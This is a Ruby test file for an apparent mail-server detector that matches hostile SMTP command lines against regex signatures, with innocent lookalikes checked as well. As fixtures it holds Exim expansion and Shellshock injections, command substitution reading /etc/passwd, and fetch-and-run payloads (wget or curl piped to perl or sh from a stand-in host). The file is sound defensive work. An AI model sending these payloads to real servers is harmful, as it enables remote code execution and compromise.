require "test_helper"
require "mail_on_rails/netserv/probe_signatures"

# The signatures are pure regexes over one command line; these pin the
# shapes each one must catch and the innocent lookalikes it must not.
class ProbeSignaturesTest < Minitest::Test
  def match(line) = MailOnRails::Netserv::ProbeSignatures.match(line)

  def test_exim_expansion_forms
    assert_equal "exim_run", match("MAIL FROM:<${run{/bin/sh -c id}}@evil.test>")
    assert_equal "exim_expansion", match("RCPT TO:<${perl{system}}@evil.test>")
  end

  def test_shellshock_preamble
    assert_equal "shellshock", match("EHLO () { :; }; /bin/id")
  end

  def test_command_substitution_reaching_for_a_system_path
    assert_equal "command_substitution", match("RCPT TO:<`/usr/bin/id`@evil.test>")
    assert_equal "command_substitution", match("MAIL FROM:<$(cat /etc/passwd)@evil.test>")
  end

  # The dropper payload seen against production: no system path in it, just
  # nohup + wget piped to perl inside $(...) in a quoted local-part.
  def test_command_substitution_opening_onto_a_downloader_or_interpreter
    payload = 'RCPT TO:<"x: Service status change: localhost $(nohup wget -qO - ' \
              'http://192.0.2.9/zed | perl &) changed from stopped to running"@cve.invalid>'
    assert_equal "command_substitution", match(payload)
    assert_equal "command_substitution", match("MAIL FROM:<$(curl -s http://192.0.2.9/x|sh)@evil.test>")
    assert_equal "command_substitution", match("EHLO `perl -e 'system(1)'`")
    assert_equal "command_substitution", match("RCPT TO:<$( busybox wget http://192.0.2.9/x )@evil.test>")
    assert_equal "command_substitution", match("RCPT TO:<$(SUDO BASH -c id)@evil.test>")
  end

  # Backtick is a legal atext character; a real local-part containing one,
  # or a program name that is just part of an address, must stay clean.
  def test_innocent_lookalikes_do_not_match
    assert_nil match("MAIL FROM:<sh`x@example.test>")
    assert_nil match("MAIL FROM:<`shane@example.test>")
    assert_nil match("RCPT TO:<perl@example.test>")
    assert_nil match("RCPT TO:<wget.user@example.test>")
    assert_nil match("MAIL FROM:<$money@example.test>")
    assert_nil match("EHLO mail.example.test")
    assert_nil match("VRFY bob")
  end

  def test_vrfy_and_expn_reconnaissance
    assert_equal "vrfy_privileged", match("vrfy root")
    assert_equal "vrfy_privileged", match("VRFY postmaster")
    assert_equal "expn_probe", match("EXPN staff")
  end
end
